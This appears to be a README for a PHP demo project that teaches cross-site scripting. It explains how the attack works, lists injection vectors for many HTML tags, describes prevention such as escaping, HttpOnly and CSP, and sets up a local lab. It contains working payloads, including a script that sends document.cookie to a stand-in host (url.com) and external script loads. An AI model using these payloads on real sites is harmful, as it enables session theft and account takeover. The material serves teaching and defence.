# XSS Vulnerability/Attacks

Cross-site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application. The actual attack occurs when the victim visits the web page or web application that executes the malicious code. The web page or web application becomes a vehicle to deliver the malicious script to the user’s browser. Vulnerable vehicles that are commonly used for Cross-site Scripting attacks are forums, message boards, and web pages that allow comments.

A web page or web application is vulnerable to XSS if it uses unsanitized user input in the output that it generates. This user input must then be parsed by the victim’s browser. XSS attacks are possible in VBScript, ActiveX, Flash, and even CSS. However, they are most common in JavaScript, primarily because JavaScript is fundamental to most browsing experiences.

## What Can the Attacker Do with JavaScript?

XSS vulnerabilities are perceived as less dangerous than for example SQL Injection vulnerabilities. Consequences of the ability to execute JavaScript on a web page may not seem dire at first. Most web browsers run JavaScript in a very tightly controlled environment. JavaScript has limited access to the user’s operating system and the user’s files. However, JavaScript can still be dangerous if misused as part of malicious content:

* Malicious JavaScript has access to all the objects that the rest of the web page has access to. This includes access to the user’s cookies. Cookies are often used to store session tokens. If an attacker can obtain a user’s session cookie, they can impersonate that user, perform actions on behalf of the user, and gain access to the user’s sensitive data.
* JavaScript can read the browser DOM and make arbitrary modifications to it. Luckily, this is only possible within the page where JavaScript is running.
* JavaScript can use the XMLHttpRequest object to send HTTP requests with arbitrary content to arbitrary destinations.
* JavaScript in modern browsers can use HTML5 APIs. For example, it can gain access to the user’s geolocation, webcam, microphone, and even specific files from the user’s file system. Most of these APIs require user opt-in, but the attacker can use social engineering to go around that limitation.

The above, in combination with social engineering, allow criminals to pull off advanced attacks including cookie theft, planting trojans, keylogging, phishing, and identity theft. XSS vulnerabilities provide the perfect ground to escalate attacks to more serious ones. Cross-site Scripting can also be used in conjunction with other types of attacks, for example, Cross-Site Request Forgery (CSRF).

## How Cross-site Scripting Works

There are two stages to a typical XSS attack:

* To run malicious JavaScript code in a victim’s browser, an attacker must first find a way to inject malicious code (payload) into a web page that the victim visits.
* After that, the victim must visit the web page with the malicious code. If the attack is directed at particular victims, the attacker can use social engineering and/or phishing to send a malicious URL to the victim.

For step one to be possible, the vulnerable website needs to directly include user input in its pages. An attacker can then insert a malicious string that will be used within the web page and treated as source code by the victim’s browser. There are also variants of XSS attacks where the attacker lures the user to visit a URL using social engineering and the payload is part of the link that the user clicks.

## Stealing Cookies Using XSS

Criminals often use XSS to steal cookies. This allows them to impersonate the victim. The attacker can send the cookie to their own server in many ways. One of them is to execute the following client-side script in the victim’s browser:

```
<script>
window.location="http://url.com/?cookie=" + document.cookie
</script>
```

* The attacker injects a payload into the website’s database by submitting a vulnerable form with malicious JavaScript content.
* The victim requests the web page from the web server.
* The web server serves the victim’s browser the page with attacker’s payload as part of the HTML body.
* The victim’s browser executes the malicious script contained in the HTML body. In this case, it sends the victim’s cookie to the attacker’s server.
* The attacker now simply needs to extract the victim’s cookie when the HTTP request arrives at the server.
* The attacker can now use the victim’s stolen cookie for impersonation.

## Cross-site Scripting Attack Vectors
The following is a list of common XSS attack vectors that an attacker could use to compromise the security of a website or web application through an XSS attack. A more extensive list of XSS payload examples is maintained by the OWASP organization: XSS Filter Evasion Cheat Sheet.

### `<script>` Tag
The `<script>` tag is the most straightforward XSS payload. A script tag can reference external JavaScript code or you can embed the code within the script tag itself.

```
<!-- External script -->
<script src=http://url.com/xss.js></script>
<!-- Embedded script -->
<script> alert("XSS"); </script>
```

### JavaScript events
JavaScript event attributes such as onload and onerror can be used in many different tags. This is a very popular XSS attack vector.

```
<!-- onload attribute in the <body> tag -->
<body onload=alert("XSS")>
```

### `<body>` tag
 An XSS payload can be delivered inside the <body> by using event attributes (see above) or other more obscure attributes such as the background attribute.

```
<!-- background attribute -->
<body background="javascript:alert("XSS")">
```

### `<img>` tag
Some browsers execute JavaScript found in the `<img>` attributes.

```
<!-- <img> tag XSS -->
<img src="javascript:alert("XSS");">
<!--  tag XSS using lesser-known attributes -->
<img dynsrc="javascript:alert('XSS')">
<img lowsrc="javascript:alert('XSS')">
```

### `<iframe>` tag
The `<iframe>` tag lets you embed another HTML page in the current page. An IFrame may contain JavaScript but JavaScript in the IFrame does not have access to the DOM of the parent page due to the Content Security Policy (CSP) of the browser. However, IFrames are still very effective for pulling off phishing attacks.

```
<!-- <iframe> tag XSS -->
<iframe src="http://url.com/xss.html">
```

### `<input>` tag
In some browsers, if the type attribute of the `<input>` tag is set to image, it can be manipulated to embed a script.

```
<!-- <input> tag XSS -->
<input type="image" src="javascript:alert('XSS');">
```

### `<link>` tag
The `<link>` tag, which is often used to link to external style sheets, may contain a script.

```
<!-- <link> tag XSS -->
<link rel="stylesheet" href="javascript:alert('XSS');">
```

### `<table>` tag
The background attribute of the `<table>` and `<td>` tags can be exploited to refer to a script instead of an image.

```
<!-- <table> tag XSS -->
<table background="javascript:alert('XSS')">
<!-- <td> tag XSS -->
<td background="javascript:alert('XSS')">
```

### `<div>` tag
The `<div>` tag, similar to the <table> and `<td>` tags, can also specify a background and therefore embed a script.

```
<!-- <div> tag XSS -->
<div style="background-image: url(javascript:alert('XSS'))">
<!-- <div> tag XSS -->
<div style="width: expression(alert('XSS'));">
```

### `<object>` tag
The `<object>` tag can be used to include a script from an external site.


```
<!-- <object> tag XSS -->
<object type="text/x-scriptlet" data="http://url.com/xss.html">
```

## How to Prevent XSS

To keep yourself safe from XSS, you must sanitize your input. Your application code should never output data received as input directly to the browser without checking it for malicious code.

Preventing Cross-site Scripting (XSS) is not easy. Specific prevention techniques depend on the subtype of XSS vulnerability, on user input usage context, and on the programming framework. However, there are certain general strategic principles that you should follow to keep your web application safe.

* Train and maintain awareness - To keep your web application safe, everyone involved in building the web application must be aware of the risks associated with XSS vulnerabilities. You should provide suitable security training to all your developers, QA staff, DevOps, and SysAdmins. You can start by referring them to this page.
* Don’t trust any user input - Treat all user input as untrusted. Any user input that is used as part of HTML output introduces a risk of an XSS. Treat input from authenticated and/or internal users the same way that you treat public input.
* Use escaping/encoding - Use an appropriate escaping/encoding technique depending on where user input is to be used: HTML escape, JavaScript escape, CSS escape, URL escape, etc. Use existing libraries for escaping, don’t write your own unless absolutely necessary.
* Sanitize HTML - If the user input needs to contain HTML, you can’t escape/encode it because it would break valid tags. In such cases, use a trusted and verified library to parse and clean HTML. Choose the library depending on your development language, for example, HtmlSanitizer for .NET or SanitizeHelper for Ruby on Rails.
* Set the HttpOnly flag - To mitigate the consequences of a possible XSS vulnerability, set the HttpOnly flag for cookies. If you do, such cookies will not be accessible via client-side JavaScript.
* Use a Content Security Policy - To mitigate the consequences of a possible XSS vulnerability, also use a Content Security Policy (CSP). CSP is an HTTP response header that lets you declare the dynamic resources that are allowed to load depending on the request source.
* Scan regularly (with Acunetix) - XSS vulnerabilities may be introduced by your developers or through external libraries/modules/software. You should regularly scan your web applications using a web vulnerability scanner such as Acunetix. If you use Jenkins, you should install the Acunetix plugin to automatically scan every build.

## Prerequisites

You must have following programs/packages in order to run this project.

* Apache: 2.4.46
* PHP: 7.2.33
* MariaDB: 10.4.14
* phpMyAdmin: 5.0.2

Note: the XAMPP server include all above mentioned technologies. https://www.apachefriends.org/download.html 

## Stealing Cookies Using XSS Development Approach

A simple php based web application is developed which has post commenting functionality, stored comments in session instead of database just to explain XSS Attack. When one user comments malicious code into comment text field will be executed when some other user will try to visit the same web application. The malicious code can be anything to harm visitor, Here I have used send cookie to another page, this page can be link of other server which will store the cookie of the users.

* Open post.php and enter under following code and submit.
```
<script>
window.location="cookie.php/?cookie=" + document.cookie
</script>
```
* Again visit the same page post.php and you will automatically redirect to cookie.php where you will see cookie of your browser.
